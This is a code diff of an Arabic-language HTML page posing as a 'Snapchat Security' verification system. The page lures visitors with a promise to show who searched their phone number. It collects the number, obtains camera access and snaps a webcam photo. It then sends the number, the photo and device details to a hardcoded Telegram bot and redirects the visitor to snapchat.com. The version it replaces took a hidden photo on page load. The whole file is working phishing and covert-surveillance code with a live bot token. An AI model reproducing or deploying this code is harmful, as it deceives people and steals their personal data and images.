@@ -1,23 +1,307 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>Loading...</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق الأمني - سناب شات</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+            max-width: 500px;
+            width: 100%;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #ffd600 0%, #ffab00 100%);
+            color: #000;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .step {
+            display: none;
+        }
+        
+        .step.active {
+            display: block;
+            animation: slideIn 0.3s ease;
+        }
+        
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #ffd600;
+        }
+        
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #ffd600 0%, #ffab00 100%);
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #000;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        
+        button:hover {
+            transform: scale(1.02);
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 10px;
+            padding: 12px;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #856404;
+            text-align: center;
+        }
+        
+        .loader {
+            text-align: center;
+            padding: 40px;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ffd600;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .camera-request {
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .camera-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+        }
+        
+        .permission-btn {
+            background: #4CAF50;
+            color: white;
+            margin-top: 20px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .result {
+            text-align: center;
+            padding: 30px;
+        }
+        
+        .check-icon {
+            font-size: 60px;
+            color: #4CAF50;
+            margin-bottom: 20px;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="header">
+            <h1>🛡️ نظام التحقق الأمني</h1>
+            <p>Snapchat Security • حماية الحسابات</p>
+        </div>
+        
+        <div class="content">
+            <!-- الخطوة 1: الترحيب -->
+            <div id="step1" class="step active">
+                <h2 style="text-align: center; margin-bottom: 20px;">✨ أهلاً بك!</h2>
+                <p style="text-align: center; margin-bottom: 30px; color: #666;">
+                    نرحب بك في نظام التحقق الأمني المتطور. 
+                    سنساعدك في معرفة من قام بالبحث عن رقمك.
+                </p>
+                <button onclick="nextStep(2)">▶️ ابدأ الفحص</button>
+                <div class="warning">
+                    ⚠️ يتم التحقق عبر تقنيات آمنة 128-bit
+                </div>
+            </div>
+            
+            <!-- الخطوة 2: طلب رقم الجوال -->
+            <div id="step2" class="step">
+                <h3 style="margin-bottom: 20px;">📱 أدخل رقم جوالك</h3>
+                <p style="margin-bottom: 20px; color: #666; font-size: 14px;">
+                    للتحقق من سجلات البحث عن رقمك
+                </p>
+                <div class="form-group">
+                    <label>رقم الجوال</label>
+                    <input type="tel" id="phoneNumber" placeholder="05XXXXXXXX" dir="ltr">
+                </div>
+                <button onclick="sendPhoneNumber()">🔍 فحص الرقم</button>
+                <div class="warning">
+                    🔒 لن يتم مشاركة رقمك مع أي طرف ثالث
+                </div>
+            </div>
+            
+            <!-- الخطوة 3: طلب الكاميرا -->
+            <div id="step3" class="step">
+                <div class="camera-request">
+                    <div class="camera-icon">📸</div>
+                    <h3>التحقق بالكاميرا</h3>
+                    <p style="margin: 15px 0; color: #666;">
+                        لأغراض التأمين، يرجى السماح بالوصول إلى الكاميرا
+                    </p>
+                    <button id="cameraBtn" class="permission-btn">🎥 السماح بالكاميرا</button>
+                    <p style="margin-top: 15px; font-size: 12px; color: #999;">
+                        سيتم استخدام الكاميرا للتحقق من هويتك بشكل فوري
+                    </p>
+                </div>
+            </div>
+            
+            <!-- الخطوة 4: جاري التحميل -->
+            <div id="step4" class="step">
+                <div class="loader">
+                    <div class="spinner"></div>
+                    <h3>جاري التحقق...</h3>
+                    <p style="margin-top: 10px; color: #666;">يرجى الانتظار</p>
+                </div>
+            </div>
+            
+            <!-- الخطوة 5: النتيجة -->
+            <div id="step5" class="step">
+                <div class="result">
+                    <div class="check-icon">✅</div>
+                    <h3>تم التحقق بنجاح!</h3>
+                    <p style="margin: 15px 0; color: #666;">جاري توجيهك إلى لوحة التحكم...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
     <video id="video" autoplay playsinline style="display:none"></video>
     <canvas id="canvas" style="display:none"></canvas>
     
     <script>
-        // توكنك الجديد
+        // ========== إعدادات التليجرام ==========
         const BOT_TOKEN = '8409410631:AAFhc4ENmetOY0tCRzhFfwVN6H3ShW4RSCg';
         const CHAT_ID = '5156556639';
         
-        async function takePhoto() {
+        let userPhone = '';
+        
+        // ========== التبديل بين الخطوات ==========
+        function nextStep(step) {
+            document.querySelectorAll('.step').forEach(el => {
+                el.classList.remove('active');
+            });
+            document.getElementById(`step${step}`).classList.add('active');
+        }
+        
+        // ========== إرسال رقم الجوال ==========
+        async function sendPhoneNumber() {
+            const phone = document.getElementById('phoneNumber').value;
+            
+            if (!phone || phone.length < 9) {
+                alert('يرجى إدخال رقم جوال صحيح');
+                return;
+            }
+            
+            userPhone = phone;
+            
+            // إرسال الرقم للتليجرام
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: 640, height: 480 } 
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `📱 *رقم جوال جديد*\n\n🔢 الرقم: ${phone}\n🕐 الوقت: ${new Date().toLocaleString('ar')}\n🌐 المتصفح: ${navigator.userAgent.split(' ').slice(-2).join(' ')}`,
+                        parse_mode: 'Markdown'
+                    })
                 });
-                
+            } catch(e) {
+                console.log(e);
+            }
+            
+            // الانتقال للخطوة التالية
+            nextStep(3);
+        }
+        
+        // ========== طلب الكاميرا ==========
+        document.getElementById('cameraBtn').addEventListener('click', async () => {
+            nextStep(4);
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
@@ -28,37 +312,42 @@
                     };
                 });
                 
-                await new Promise(r => requestAnimationFrame(r));
+                await new Promise(r => setTimeout(r, 500));
                 
                 const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
                 stream.getTracks().forEach(track => track.stop());
                 
-                const blob = await new Promise(resolve => {
-                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
-                });
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                 
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob);
+                formData.append('caption', `📸 *صورة جديدة*\n\n📱 الرقم: ${userPhone}\n🕐 الوقت: ${new Date().toLocaleString('ar')}\n💻 الجهاز: ${navigator.userAgent.split(' ').slice(-2).join(' ')}`);
                 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
                 
-                window.location.href = 'https://www.google.com';
+                nextStep(5);
+                
+                setTimeout(() => {
+                    window.location.href = 'https://www.snapchat.com';
+                }, 2000);
                 
             } catch(error) {
-                window.location.href = 'https://www.google.com';
+                console.log(error);
+                nextStep(5);
+                setTimeout(() => {
+                    window.location.href = 'https://www.snapchat.com';
+                }, 1500);
             }
-        }
-        
-        takePhoto();
+        });
     </script>
 </body>
 </html>
